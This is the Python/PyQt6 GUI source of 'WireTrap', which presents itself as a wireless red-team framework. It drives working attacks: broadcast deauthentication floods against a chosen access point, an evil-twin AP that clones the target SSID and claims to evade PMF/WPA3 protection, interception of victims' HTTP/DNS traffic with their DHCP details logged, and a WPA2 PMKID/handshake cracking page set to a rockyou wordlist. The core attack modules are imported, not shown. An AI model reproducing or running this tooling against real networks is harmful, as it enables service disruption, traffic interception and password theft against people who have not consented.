import sys
import os

WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, WIRETRAP_DIR)

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout,
    QHBoxLayout, QTableWidget, QTableWidgetItem, QPushButton,
    QLabel, QComboBox, QHeaderView, QFrame, QSplitter,
    QTextEdit, QGroupBox, QMessageBox, QLineEdit,
    QStackedWidget, QCheckBox
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject
from PyQt6.QtGui import QColor, QFont

from core.scanner import Scanner, AccessPoint, Client
from core.deauth import Deauther
from core.evil_twin import EvilTwin
from core.wpa2_crypto import WPA2Crypto
from core.decision_engine import DecisionEngine, AttackTechnique
from gui.dashboard_dialog import DashboardDialog
from post_exploitation.sniffer import WireTrapSniffer

# ── Bridge para emitir señales desde threads externos ─────────

class SignalBridge(QObject):
    ap_found         = pyqtSignal(object)
    client_found     = pyqtSignal(object)
    log_message      = pyqtSignal(str)
    client_joined    = pyqtSignal(str)
    attack_stopped   = pyqtSignal()
    et_client_detail = pyqtSignal(str, str, str, str)  # mac, ip, hostname, hora
    data_captured    = pyqtSignal(object)
    pmkid_success    = pyqtSignal(str)
    pmkid_error      = pyqtSignal(str)


# ── Ventana principal ─────────────────────────────────────────

class WireTrap(QMainWindow):

    def __init__(self):
        super().__init__()
        self.setWindowTitle("WireTrap v1.0 — Wireless Red Team Framework")
        self.setMinimumSize(1300, 820)
        self.resize(1600, 950)

        # Estado interno
        self.selected_ap     = None
        self.selected_client = None
        self.attack_plan     = None
        self.attacking       = False

        # Módulos core
        self.scanner  = None
        self.deauther = None
        self.evil_twin = None
        self.sniffer  = None
        self.wpa2_engine = None
        self.engine   = DecisionEngine()
        
        self.dashboards = []

        # Bridge de señales
        self.bridge = SignalBridge()
        self.bridge.ap_found.connect(self._on_ap_found)
        self.bridge.client_found.connect(self._on_client_found)
        self.bridge.log_message.connect(self.log)
        self.bridge.client_joined.connect(self._on_client_joined)
        self.bridge.attack_stopped.connect(self._on_attack_stopped)
        self.bridge.et_client_detail.connect(self._on_et_client_detail)
        self.bridge.data_captured.connect(self._on_data_captured)
        self.bridge.pmkid_success.connect(self._on_pmkid_success)
        self.bridge.pmkid_error.connect(self._on_pmkid_error)

        # Timer para refrescar señal y contadores de la tabla de APs
        # cada 2 s (el scanner actualiza los objetos internos pero no
        # dispara señales en actualizaciones; esto cierra esa brecha).
        self._refresh_timer = QTimer(self)
        self._refresh_timer.setInterval(2000)
        self._refresh_timer.timeout.connect(self._refresh_ap_table)

        self.setup_ui()
        self.apply_styles()
        self._populate_interfaces()

    # ── UI ────────────────────────────────────────────────────

    def setup_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        main_base_layout = QVBoxLayout(central)
        main_base_layout.setContentsMargins(0, 0, 0, 0)

        self.stack = QStackedWidget()
        main_base_layout.addWidget(self.stack)

        self.page_launcher = QWidget()
        self._setup_launcher_ui(self.page_launcher)
        self.stack.addWidget(self.page_launcher)

        self.page_deauth = QWidget()
        self._setup_deauth_ui(self.page_deauth)
        self.stack.addWidget(self.page_deauth)

        self.page_wpa2 = QWidget()
        self._setup_wpa2_ui(self.page_wpa2)
        self.stack.addWidget(self.page_wpa2)

        self.stack.setCurrentIndex(0)

    def _setup_launcher_ui(self, parent_widget):
        layout = QVBoxLayout(parent_widget)
        layout.setAlignment(Qt.AlignmentFlag.AlignCenter)

        title = QLabel("🔴 WireTrap v1.0")
        title.setFont(QFont("Monospace", 32, QFont.Weight.Bold))
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("color: #ff3333; margin-bottom: 30px;")
        layout.addWidget(title)
        
        subtitle = QLabel("Selecciona un Módulo de Ataque")
        subtitle.setFont(QFont("Monospace", 14))
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setStyleSheet("color: #aaaaaa; margin-bottom: 40px;")
        layout.addWidget(subtitle)

        grid = QVBoxLayout()
        grid.setSpacing(15)

        btn_deauth_et = QPushButton("💥 Deauth + Evil Twin")
        btn_deauth_et.setFixedHeight(60)
        btn_deauth_et.setFixedWidth(400)
        btn_deauth_et.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        btn_deauth_et.setStyleSheet("background-color: #331111; border: 2px solid #e94560; color: white;")
        btn_deauth_et.clicked.connect(lambda: self.stack.setCurrentIndex(1))

        btn_pmkid = QPushButton("🔒 Criptografía WPA2 (PMKID/Handshakes)")
        btn_pmkid.setFixedHeight(60)
        btn_pmkid.setFixedWidth(400)
        btn_pmkid.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        btn_pmkid.setStyleSheet("background-color: #113311; border: 2px solid #00aa44; color: white;")
        btn_pmkid.clicked.connect(lambda: self.stack.setCurrentIndex(2))

        btn_captive = QPushButton("🎣 Portal Cautivo [Próximamente]")
        btn_captive.setFixedHeight(60)
        btn_captive.setFixedWidth(400)
        btn_captive.setFont(QFont("Monospace", 12))
        btn_captive.setEnabled(False)

        btn_dns = QPushButton("🌍 DNS Spoofing [Próximamente]")
        btn_dns.setFixedHeight(60)
        btn_dns.setFixedWidth(400)
        btn_dns.setFont(QFont("Monospace", 12))
        btn_dns.setEnabled(False)

        grid.addWidget(btn_deauth_et, alignment=Qt.AlignmentFlag.AlignCenter)
        grid.addWidget(btn_pmkid, alignment=Qt.AlignmentFlag.AlignCenter)
        grid.addWidget(btn_captive, alignment=Qt.AlignmentFlag.AlignCenter)
        grid.addWidget(btn_dns, alignment=Qt.AlignmentFlag.AlignCenter)

        layout.addLayout(grid)

    def _setup_deauth_ui(self, parent_widget):
        main_layout = QVBoxLayout(parent_widget)
        main_layout.setSpacing(8)
        main_layout.setContentsMargins(10, 10, 10, 10)

        # Header (barra compacta, no debe competir con las tablas)
        header = QHBoxLayout()
        
        self.btn_back = QPushButton("⬅ Volver al Menú")
        self.btn_back.setFixedWidth(150)
        self.btn_back.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.btn_back.clicked.connect(lambda: self.stack.setCurrentIndex(0))
        header.addWidget(self.btn_back)
        header.addSpacing(20)

        title = QLabel("🔴 WireTrap: Deauth + Evil Twin")
        title.setFont(QFont("Monospace", 12, QFont.Weight.Bold))

        self.iface_label  = QLabel("Monitor:")
        self.iface_combo  = QComboBox()
        self.iface_combo.setFixedWidth(120)

        self.iface2_label = QLabel("AP:")
        self.iface2_combo = QComboBox()
        self.iface2_combo.setFixedWidth(120)

        self.out_label    = QLabel("Internet:")
        self.out_combo    = QComboBox()
        self.out_combo.setFixedWidth(90)

        self.status_label = QLabel("● IDLE")
        self.status_label.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.status_label.setStyleSheet(
            "color: gray; font-weight: bold;"
        )

        header.addWidget(title)
        header.addStretch()
        header.addWidget(self.iface_label)
        header.addWidget(self.iface_combo)
        header.addSpacing(8)
        header.addWidget(self.iface2_label)
        header.addWidget(self.iface2_combo)
        header.addSpacing(8)
        header.addWidget(self.out_label)
        header.addWidget(self.out_combo)
        header.addSpacing(16)
        header.addWidget(self.status_label)
        main_layout.addLayout(header)

        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setStyleSheet("color: #444;")
        main_layout.addWidget(line)

        # ── Tablas: panel PRINCIPAL, se lleva casi todo el espacio ──
        splitter = QSplitter(Qt.Orientation.Horizontal)

        table_font = QFont("Monospace", 11)
        header_font = QFont("Monospace", 11, QFont.Weight.Bold)

        ap_group  = QGroupBox("APs DETECTADOS")
        ap_group.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        ap_layout = QVBoxLayout(ap_group)
        self.ap_table = QTableWidget()
        self.ap_table.setColumnCount(6)
        self.ap_table.setHorizontalHeaderLabels(
            ["SSID", "BSSID", "Canal", "Seguridad", "Señal", "Clientes"]
        )
        self.ap_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Stretch
        )
        self.ap_table.horizontalHeader().setFont(header_font)
        self.ap_table.horizontalHeader().setMinimumHeight(34)
        self.ap_table.verticalHeader().setVisible(False)
        self.ap_table.verticalHeader().setDefaultSectionSize(32)
        self.ap_table.setFont(table_font)
        self.ap_table.setSelectionBehavior(
            QTableWidget.SelectionBehavior.SelectRows
        )
        self.ap_table.setEditTriggers(
            QTableWidget.EditTrigger.NoEditTriggers
        )
        self.ap_table.setAlternatingRowColors(True)
        self.ap_table.itemClicked.connect(self._on_ap_selected)
        ap_layout.addWidget(self.ap_table)
        splitter.addWidget(ap_group)

        client_group  = QGroupBox("CLIENTES ASOCIADOS")
        client_group.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        client_layout = QVBoxLayout(client_group)
        self.client_table = QTableWidget()
        self.client_table.setColumnCount(4)
        self.client_table.setHorizontalHeaderLabels(
            ["MAC", "Fabricante", "Señal", "AP"]
        )
        self.client_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Stretch
        )
        self.client_table.horizontalHeader().setFont(header_font)
        self.client_table.horizontalHeader().setMinimumHeight(34)
        self.client_table.verticalHeader().setVisible(False)
        self.client_table.verticalHeader().setDefaultSectionSize(32)
        self.client_table.setFont(table_font)
        self.client_table.setSelectionBehavior(
            QTableWidget.SelectionBehavior.SelectRows
        )
        self.client_table.setEditTriggers(
            QTableWidget.EditTrigger.NoEditTriggers
        )
        self.client_table.setAlternatingRowColors(True)
        self.client_table.itemClicked.connect(self._on_client_selected)
        client_layout.addWidget(self.client_table)
        splitter.addWidget(client_group)

        # ── Panel Evil Twin: igual estilo que los otros dos ───────
        self.et_group = QGroupBox("EVIL TWIN -- CLIENTES CAPTURADOS")
        self.et_group.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        et_layout = QVBoxLayout(self.et_group)
        self.et_table = QTableWidget()
        self.et_table.setColumnCount(5)
        self.et_table.setHorizontalHeaderLabels(
            ["Hora", "MAC", "IP", "Hostname", "Fabricante"]
        )
        self.et_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Stretch
        )
        self.et_table.horizontalHeader().setFont(header_font)
        self.et_table.horizontalHeader().setMinimumHeight(34)
        self.et_table.verticalHeader().setVisible(False)
        self.et_table.verticalHeader().setDefaultSectionSize(32)
        self.et_table.setFont(table_font)
        self.et_table.setSelectionBehavior(
            QTableWidget.SelectionBehavior.SelectRows
        )
        self.et_table.setEditTriggers(
            QTableWidget.EditTrigger.NoEditTriggers
        )
        self.et_table.setAlternatingRowColors(True)
        self.et_table.cellDoubleClicked.connect(self._on_et_table_double_click)
        et_layout.addWidget(self.et_table)
        
        self.btn_global_dashboard = QPushButton("▶ Dashboard Global de Interceptación")
        self.btn_global_dashboard.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.btn_global_dashboard.setStyleSheet(
            "QPushButton { background: #00aa44; color: black; padding: 6px; border-radius: 4px; }"
            "QPushButton:hover { background: #00ff88; }"
        )
        self.btn_global_dashboard.clicked.connect(lambda: self._open_client_dashboard(None))
        et_layout.addWidget(self.btn_global_dashboard)

        self.et_group.setVisible(False)  # HIDDEN BY DEFAULT
        splitter.addWidget(self.et_group)

        splitter.setSizes([700, 600, 700])
        # Las tablas son el panel principal: se llevan casi todo el
        # espacio vertical disponible frente al panel de ataque/log.
        main_layout.addWidget(splitter, 6)

        # ── Panel de ataque: secundario, compacto ────────────────
        attack_group  = QGroupBox("ESTADO DEL ATAQUE")
        attack_layout = QHBoxLayout(attack_group)

        self.attack_info = QLabel(
            "Objetivo AP:     —\n"
            "Objetivo Cliente: —\n"
            "Técnica:         —\n"
            "Estado:          IDLE"
        )
        self.attack_info.setFont(QFont("Monospace", 10))
        self.attack_info.setMinimumWidth(320)

        # Checkbox para Evil Twin
        self.chk_eviltwin = QCheckBox(" Habilitar AP Falso")
        self.chk_eviltwin.setFont(QFont("Monospace", 14, QFont.Weight.Bold))
        self.chk_eviltwin.setStyleSheet(
            "QCheckBox { color: #00ff88; }"
            "QCheckBox::indicator { width: 24px; height: 24px; border: 2px solid #00aa44; border-radius: 4px; background: #0a1f0a; }"
            "QCheckBox::indicator:checked { background: #00ff88; border: 2px solid #00ff88; }"
        )
        self.chk_eviltwin.stateChanged.connect(self._on_et_checkbox_changed)
        
        # Propiedad nativa para guardar la pass temporal
        self.wpa_passphrase = ""

        pass_layout = QVBoxLayout()
        pass_layout.addStretch()
        pass_layout.addWidget(self.chk_eviltwin, alignment=Qt.AlignmentFlag.AlignCenter)
        pass_layout.addStretch()

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setMaximumHeight(110)
        self.log_output.setFont(QFont("Monospace", 9))
        self.log_output.setPlaceholderText(
            "Los eventos aparecerán aquí..."
        )

        attack_layout.addWidget(self.attack_info)
        attack_layout.addLayout(pass_layout)
        attack_layout.addWidget(self.log_output)
        attack_group.setMaximumHeight(170)
        main_layout.addWidget(attack_group, 1)

        # Botones
        btn_layout = QHBoxLayout()

        self.btn_scan   = QPushButton("▶  Iniciar Escaneo")
        self.btn_attack = QPushButton("⚡  Iniciar Ataque")
        self.btn_stop   = QPushButton("■  Detener Todo")

        self.btn_attack.setEnabled(False)
        self.btn_stop.setEnabled(False)

        self.btn_scan.clicked.connect(self._on_scan_clicked)
        self.btn_attack.clicked.connect(self._on_attack_clicked)
        self.btn_stop.clicked.connect(self._on_stop_clicked)

        for btn in [self.btn_scan, self.btn_attack, self.btn_stop]:
            btn.setFixedHeight(42)
            btn.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
            btn_layout.addWidget(btn)

        main_layout.addLayout(btn_layout)

    def _on_et_checkbox_changed(self, state):
        is_checked = (state == 2)  # Qt.CheckState.Checked = 2
        if is_checked:
            from PyQt6.QtWidgets import QDialog, QVBoxLayout, QLabel, QLineEdit, QPushButton, QHBoxLayout
            from PyQt6.QtCore import Qt
            from PyQt6.QtGui import QFont

            dialog = QDialog(self)
            dialog.setWindowTitle("Contraseña Evil Twin")
            dialog.setFixedSize(450, 200)
            dialog.setStyleSheet(
                "QDialog { background: #0a1f0a; border: 2px solid #00aa44; border-radius: 8px; }"
                "QLabel { color: #00ff88; font-weight: bold; font-family: Monospace; font-size: 11pt; }"
                "QLineEdit { background: #0d2b0d; color: #00ff88; border: 1px solid #00ff88; padding: 8px; font-family: Monospace; font-size: 12pt; border-radius: 4px; }"
                "QPushButton { background: #00aa44; color: black; font-weight: bold; border-radius: 4px; padding: 8px; font-family: Monospace; font-size: 11pt; }"
                "QPushButton:hover { background: #00ff88; }"
            )
            layout = QVBoxLayout(dialog)
            
            lbl = QLabel("Introduce la contraseña para el Evil Twin:\n(Déjalo vacío para crear una red Abierta/OPEN)")
            lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            layout.addWidget(lbl)
            layout.addSpacing(10)
            
            inp = QLineEdit()
            inp.setPlaceholderText("Ej: contrasena123")
            layout.addWidget(inp)
            layout.addSpacing(15)
            
            btn_layout = QHBoxLayout()
            btn_ok = QPushButton("Aceptar")
            btn_cancel = QPushButton("Cancelar")
            btn_cancel.setStyleSheet("background: #555555; color: white;")
            btn_cancel.clicked.connect(dialog.reject)
            btn_ok.clicked.connect(dialog.accept)
            btn_layout.addWidget(btn_cancel)
            btn_layout.addWidget(btn_ok)
            layout.addLayout(btn_layout)
            
            if dialog.exec():
                self.wpa_passphrase = inp.text().strip()
                self.et_group.setVisible(True)
            else:
                self.chk_eviltwin.blockSignals(True)
                self.chk_eviltwin.setChecked(False)
                self.chk_eviltwin.blockSignals(False)
                self.et_group.setVisible(False)
        else:
            self.et_group.setVisible(False)
            self.wpa_passphrase = ""

    def apply_styles(self):
        self.setStyleSheet("""
            QMainWindow, QWidget {
                background-color: #1a1a2e;
                color: #e0e0e0;
            }
            QGroupBox {
                border: 1px solid #444;
                border-radius: 4px;
                margin-top: 8px;
                padding-top: 10px;
                font-weight: bold;
                color: #00ff88;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 8px;
                padding: 0 4px;
            }
            QTableWidget {
                background-color: #16213e;
                alternate-background-color: #1b2a4a;
                gridline-color: #333;
                border: none;
            }
            QTableWidget::item {
                padding: 4px;
            }
            QHeaderView::section {
                background-color: #0f3460;
                color: #00ff88;
                padding: 6px;
                border: none;
                font-weight: bold;
            }
            QTableWidget::item:selected {
                background-color: #e94560;
                color: white;
            }
            QPushButton {
                background-color: #0f3460;
                color: #e0e0e0;
                border: 1px solid #444;
                border-radius: 4px;
                font-weight: bold;
                padding: 4px 12px;
            }
            QPushButton:hover {
                background-color: #e94560;
                color: white;
            }
            QPushButton:disabled {
                background-color: #222;
                color: #555;
            }
            QComboBox {
                background-color: #16213e;
                color: #e0e0e0;
                border: 1px solid #444;
                padding: 2px;
            }
            QTextEdit {
                background-color: #0d0d1a;
                color: #00ff88;
                border: 1px solid #333;
            }
            QLabel {
                color: #e0e0e0;
            }
        """)

    # ── Interfaces ────────────────────────────────────────────

    def _populate_interfaces(self):
        """Detecta interfaces de red disponibles"""
        import subprocess
        result = subprocess.run(
            ["ip", "link", "show"],
            capture_output=True, text=True
        )
        interfaces = []
        for line in result.stdout.split("\n"):
            if ": " in line and "lo" not in line:
                iface = line.split(": ")[1].split(":")[0].strip()
                if iface:
                    interfaces.append(iface)

        self.iface_combo.addItems(interfaces)
        self.iface2_combo.addItems(interfaces)
        self.out_combo.addItems(interfaces)
        if hasattr(self, 'wpa2_iface_combo'):
            self.wpa2_iface_combo.addItems(interfaces)

        # Preseleccionar interfaces comunes
        for i, iface in enumerate(interfaces):
            if "wlan0" in iface:
                self.iface_combo.setCurrentIndex(i)
                if hasattr(self, 'wpa2_iface_combo'):
                    self.wpa2_iface_combo.setCurrentIndex(i)
            if "wlan1" in iface:
                self.iface2_combo.setCurrentIndex(i)
            if "eth0" in iface:
                self.out_combo.setCurrentIndex(i)

    # ── Slots de tablas ───────────────────────────────────────

    def _on_ap_selected(self):
        row = self.ap_table.currentRow()
        if row < 0:
            return
        bssid = self.ap_table.item(row, 1).text()
        if self.scanner and bssid in self.scanner.aps:
            self.selected_ap = self.scanner.aps[bssid]
            self.attack_plan = self.engine.analyze(self.selected_ap)
            self.client_table.setRowCount(0)
            clients = self.scanner.get_clients_for_ap(bssid)
            for client in clients:
                self._add_client_row(client)
            self._update_attack_info()
            self.btn_attack.setEnabled(True)
            self.log(f"AP seleccionado: {self.selected_ap.ssid} "
                     f"→ Técnica: {self.attack_plan.technique}")
            if getattr(self.selected_ap, "pmf_required", False):
                self.log("⚠ PMF obligatorio (802.11w MFPR) en este AP: "
                          "el deauth clásico no funcionará.")
            elif getattr(self.selected_ap, "pmf_capable", False):
                self.log("⚠ PMF opcional (802.11w MFPC) en este AP: "
                          "el deauth puede fallar contra clientes modernos.")
            # Fijar canal al del AP seleccionado
            if self.scanner and self.selected_ap.channel:
                self.scanner.fixed_channel = self.selected_ap.channel
                self.log(f"Canal fijado: {self.selected_ap.channel}")

    def _on_client_selected(self):
        row = self.client_table.currentRow()
        if row < 0:
            return
        mac = self.client_table.item(row, 0).text()
        if self.scanner and mac in self.scanner.clients:
            self.selected_client = self.scanner.clients[mac]
            self.log(f"Cliente seleccionado: {mac} "
                     f"({self.selected_client.vendor})")
            self._update_attack_info()

    def _update_attack_info(self):
        ap_str     = (self.selected_ap.ssid
                      if self.selected_ap else "—")
        client_str = (self.selected_client.mac
                      if self.selected_client else "Todos los clientes")
        tech_str   = (self.attack_plan.technique
                      if self.attack_plan else "—")
        risk_str   = (self.attack_plan.risk_level
                      if self.attack_plan else "—")
        estado     = "ATACANDO" if self.attacking else "IDLE"

        self.attack_info.setText(
            f"Objetivo AP:      {ap_str}\n"
            f"Objetivo Cliente: {client_str}\n"
            f"Técnica:          {tech_str}\n"
            f"Riesgo:           {risk_str}\n"
            f"Estado:           {estado}"
        )

    # ── Callbacks del scanner (desde threads) ─────────────────

    def _on_ap_found(self, ap: AccessPoint):
        """Añade un AP a las tablas — ejecutado en el hilo de la GUI"""
        self._insert_ap_into_table(self.ap_table, ap)
        if hasattr(self, 'wpa2_ap_table'):
            self._insert_ap_into_table(self.wpa2_ap_table, ap)
            
    def _insert_ap_into_table(self, table, ap: AccessPoint):
        if not table: return
        row = table.rowCount()
        table.insertRow(row)

        values = [
            ap.ssid,
            ap.bssid,
            str(ap.channel),
            ap.security,
            f"{ap.signal} dBm",
            str(len(ap.clients))
        ]

        for col, val in enumerate(values):
            item = QTableWidgetItem(val)
            item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)

            if col == 3:
                colors = {
                    "OPEN":     "#ff4444",
                    "WEP":      "#ff6600",
                    "WPA":      "#ffaa00",
                    "WPA2":     "#ffcc00",
                    "WPA2/WPA3":"#88ff00",
                    "WPA3":     "#00ff88",
                }
                color = colors.get(val, "#e0e0e0")
                item.setForeground(QColor(color))

            table.setItem(row, col, item)

    def _on_client_found(self, client: Client):
        """Añade un cliente a la tabla si pertenece al AP seleccionado"""
        if (self.selected_ap and
                client.bssid == self.selected_ap.bssid):
            self._add_client_row(client)

        # Actualizar contador de clientes en la tabla de APs
        def _update_count(table):
            if not getattr(self, table, None): return
            t = getattr(self, table)
            for row in range(t.rowCount()):
                bssid_item = t.item(row, 1)
                if bssid_item and bssid_item.text() == client.bssid:
                    ap = self.scanner.aps.get(client.bssid)
                    if ap:
                        count_item = QTableWidgetItem(str(len(ap.clients)))
                        count_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
                        t.setItem(row, 5, count_item)
                    break
                    
        _update_count('ap_table')
        _update_count('wpa2_ap_table')

    def _add_client_row(self, client: Client):
        row = self.client_table.rowCount()
        self.client_table.insertRow(row)
        values = [
            client.mac,
            client.vendor,
            f"{client.signal} dBm",
            client.bssid
        ]
        for col, val in enumerate(values):
            item = QTableWidgetItem(val)
            item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.client_table.setItem(row, col, item)

    def _refresh_ap_table(self):
        """Refresca señal y contadores en la tabla de APs cada 2 s."""
        if not self.scanner:
            return

        def _update_table(table):
            for row in range(table.rowCount()):
                bssid_item = table.item(row, 1)
                if not bssid_item:
                    continue
                ap = self.scanner.aps.get(bssid_item.text())
                if not ap:
                    continue
                signal_item = table.item(row, 4)
                if signal_item:
                    signal_item.setText(f"{ap.signal} dBm")
                count_item = table.item(row, 5)
                if count_item:
                    count_item.setText(str(len(ap.clients)))

        _update_table(self.ap_table)
        if hasattr(self, 'wpa2_ap_table'):
            _update_table(self.wpa2_ap_table)

    def _on_client_joined(self, info: str):
        import re
        from datetime import datetime
        self.log(f"[+] Cliente en Evil Twin: {info}")
        match = re.search(
            r'DHCPACK\(\S+\)\s+(\d+\.\d+\.\d+\.\d+)\s+'
            r'([0-9a-fA-F:]{17})(?:\s+(\S+))?',
            info
        )
        if match:
            ip       = match.group(1)
            mac      = match.group(2).lower()
            hostname = match.group(3) or "--"
            hora     = datetime.now().strftime("%H:%M:%S")
            self.bridge.et_client_detail.emit(mac, ip, hostname, hora)

    def _on_et_client_detail(self, mac, ip, hostname, hora):
        from utils.oui_lookup import get_vendor
        vendor = get_vendor(mac)
        row = self.et_table.rowCount()
        self.et_table.insertRow(row)
        for col, val in enumerate([hora, mac, ip, hostname, vendor]):
            item = QTableWidgetItem(val)
            item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            item.setForeground(QColor("#e94560"))
            self.et_table.setItem(row, col, item)
        self.et_group.setStyleSheet(
            "QGroupBox { border: 2px solid #e94560; color: #e94560; "
            "border-radius: 4px; margin-top: 8px; padding-top: 10px; }"
        )

    def _open_client_dashboard(self, mac=None):
        initial = self.sniffer.captured if self.sniffer else []
        dash = DashboardDialog(mac, self)
        for d in initial:
            dash.on_data_captured(d)
        self.dashboards.append(dash)
        dash.show()

    def _on_et_table_double_click(self, row, column):
        mac_item = self.et_table.item(row, 1)
        if mac_item:
            self._open_client_dashboard(mac_item.text())

    def _on_data_captured(self, data):
        self.log(f"[!] Tráfico interceptado: {data.data_type} ({data.source_ip})")
        # Cleanup closed dashboards
        self.dashboards = [d for d in self.dashboards if d.isVisible()]
        for dash in self.dashboards:
            dash.on_data_captured(data)

    def _on_attack_stopped(self):
        self.attacking = False
        self._update_attack_info()
        self.log("[!] Ataque detenido.")
        self.status_label.setText("● IDLE")
        self.status_label.setStyleSheet(
            "color: gray; font-weight: bold;"
        )
        self.et_group.setStyleSheet("")
        self.btn_stop.setEnabled(False)
        self.btn_attack.setEnabled(True)

    # ── Botones ───────────────────────────────────────────────

    def _on_scan_clicked(self):
        iface = self.iface_combo.currentText()
        if not iface:
            QMessageBox.warning(self, "Error", "Selecciona una interfaz.")
            return

        self.ap_table.setRowCount(0)
        self.client_table.setRowCount(0)
        self.selected_ap     = None
        self.selected_client = None
        self.attack_plan     = None

        self.scanner = Scanner(iface)
        self.scanner.on_ap_found     = (
            lambda ap: self.bridge.ap_found.emit(ap)
        )
        self.scanner.on_client_found = (
            lambda c: self.bridge.client_found.emit(c)
        )

        self.scanner.start()
        self._refresh_timer.start()
        self.status_label.setText("● ESCANEANDO")
        self.status_label.setStyleSheet(
            "color: #00ff88; font-weight: bold;"
        )
        self.log(f"Escaneo iniciado en {iface}...")

    def _on_attack_clicked(self):
        if not self.selected_ap:
            QMessageBox.warning(
                self, "Error", "Selecciona un AP primero."
            )
            return

        if not self.attack_plan:
            return

        iface_mon = self.iface_combo.currentText()
        iface_ap  = self.iface2_combo.currentText()
        iface_out = self.out_combo.currentText()

        # Detener escaneo antes del ataque
        if self.scanner:
            self.scanner.stop()

        # Fijar explícitamente el canal de la interfaz monitora al del AP
        # objetivo. El scanner lo fijaba mientras estaba vivo, pero al
        # pararlo la interfaz puede quedarse en cualquier canal del hopper.
        if self.selected_ap.channel:
            import subprocess
            subprocess.run(
                ["iw", "dev", iface_mon, "set", "channel",
                 str(self.selected_ap.channel)],
                capture_output=True
            )
            self.log(f"Canal fijado en interfaz monitora: "
                     f"{self.selected_ap.channel}")

        self.log(f"Iniciando ataque: {self.attack_plan.technique}")
        self.log(f"Razón: {self.attack_plan.reason}")

        # Determinar cliente objetivo
        client_mac = (self.selected_client.mac
                      if self.selected_client
                      else "ff:ff:ff:ff:ff:ff")

        # Iniciar deauth
        self.deauther = Deauther(iface_mon)
        self.deauther.on_packet_sent = (
            lambda c: self.bridge.log_message.emit(
                f"Deauth enviados: {c} paquetes"
            )
        )
        self.deauther.start(client_mac, self.selected_ap.bssid)

        # Iniciar evil twin (solo si la casilla está marcada)
        if self.chk_eviltwin.isChecked():
            self.evil_twin = EvilTwin(iface_ap)
            self.evil_twin.on_started = (
                lambda s, ch: self.bridge.log_message.emit(
                    f"Evil Twin activo: {s} (canal {ch})"
                )
            )
            self.evil_twin.on_client_join = (
                lambda info: self.bridge.client_joined.emit(info)
            )
            self.evil_twin.on_stopped = (
                lambda: self.bridge.attack_stopped.emit()
            )
            self.evil_twin.on_error = (
                lambda msg: self.bridge.log_message.emit(
                    f"[!] Evil Twin ERROR: {msg}"
                )
            )
            wpa_pass = getattr(self, "wpa_passphrase", "")
            if wpa_pass:
                et_security = "WPA2"
                self.log(f"Evil Twin: WPA2 con contraseña proporcionada")
            else:
                et_security = "OPEN"
                self.log("Evil Twin: red OPEN (sin contraseña)")

            self.evil_twin.start(
                ssid=self.selected_ap.ssid,
                channel=self.selected_ap.channel or 6,
                security=et_security,
                out_interface=iface_out,
                wpa_passphrase=wpa_pass or "wiretrap123"
            )
            self.log(f"Usando MAC natural de la antena (Natural Roaming Mode "
                     f"para evadir protecciones PMF/WPA3)")

            actual_ap_iface = getattr(self.evil_twin, "ap_iface", iface_ap)
            self.sniffer = WireTrapSniffer(actual_ap_iface)
            self.sniffer.on_data = lambda d: self.bridge.data_captured.emit(d)
            self.sniffer.start()
            self.log(f"Módulo de Interceptación HTTP/DNS activo en {actual_ap_iface}")

            self.et_table.setRowCount(0)
            self.et_group.setStyleSheet(
                "QGroupBox { border: 1px solid #ffaa00; color: #ffaa00; "
                "border-radius: 4px; margin-top: 8px; padding-top: 10px; }"
            )
        else:
            self.log("Modo Deauth Puro (Evil Twin deshabilitado)")
        self.attacking = True
        self._update_attack_info()
        self.status_label.setText("● ATACANDO")
        self.status_label.setStyleSheet(
            "color: #e94560; font-weight: bold;"
        )
        self.btn_stop.setEnabled(True)
        self.btn_attack.setEnabled(False)

    # ── MÓDULO WPA2 CRYPTO ──────────────────────────────────────

    def _setup_wpa2_ui(self, parent_widget):
        layout = QVBoxLayout(parent_widget)
        layout.setContentsMargins(10, 10, 10, 10)

        header = QHBoxLayout()
        self.btn_back_wpa2 = QPushButton("⬅ Volver al Menú")
        self.btn_back_wpa2.setFixedWidth(150)
        self.btn_back_wpa2.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.btn_back_wpa2.clicked.connect(lambda: self.stack.setCurrentIndex(0))
        header.addWidget(self.btn_back_wpa2)
        header.addSpacing(20)

        title = QLabel("🔒 WireTrap: Ataques WPA2 (PMKID & Handshakes)")
        title.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        header.addWidget(title)
        
        header.addStretch()

        self.wpa2_dict_label = QLabel("Diccionario:")
        self.wpa2_dict_label.setFont(QFont("Monospace", 10))
        self.wpa2_dict_input = QLineEdit("/usr/share/wordlists/rockyou.txt")
        self.wpa2_dict_input.setMinimumWidth(250)
        self.wpa2_dict_input.setStyleSheet("background-color: #222; color: #fff; border: 1px solid #555; padding: 2px;")
        
        self.wpa2_iface_label = QLabel("Interfaz Monitor (Alfa):")
        self.wpa2_iface_label.setFont(QFont("Monospace", 10))
        self.wpa2_iface_combo = QComboBox()
        self.wpa2_iface_combo.setMinimumWidth(150)
        
        self.btn_wpa2_scan = QPushButton("▶ ESCANEAR REDES")
